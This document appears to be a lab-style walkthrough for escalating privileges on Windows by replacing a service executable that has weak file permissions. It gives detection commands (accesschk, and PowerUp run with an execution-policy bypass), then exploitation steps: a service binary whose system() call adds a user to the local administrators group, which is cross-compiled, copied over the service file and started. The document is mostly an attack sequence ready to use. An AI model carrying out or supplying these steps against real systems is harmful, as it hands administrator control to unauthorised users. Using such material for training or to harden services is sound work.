Executable Files

# Executable Files
Detection
Target
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
or

 ```
powershell -ep bypass
 . .\PowerUp.ps1
 Invoke-AllChecks
```


Exploitation

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Target.
2. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators <user> /add
3. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
4. Copy the generated file x.exe, to the Target

Target
1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
2. In command prompt type: sc start filepermsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators
